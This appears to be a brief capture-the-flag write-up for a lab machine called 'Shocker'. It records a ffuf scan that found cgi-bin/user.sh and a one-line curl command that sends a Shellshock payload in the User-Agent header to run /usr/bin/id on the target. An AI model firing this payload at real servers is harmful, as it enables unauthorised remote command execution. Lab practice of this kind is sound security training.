# Shocker

## Enum

After scanning with ffuf, the following file was found.  

`cgi-bin/user.sh`

## User

Shellshock vuln found with the following command.  

`curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://10.129.132.254/cgi-bin/user.sh`

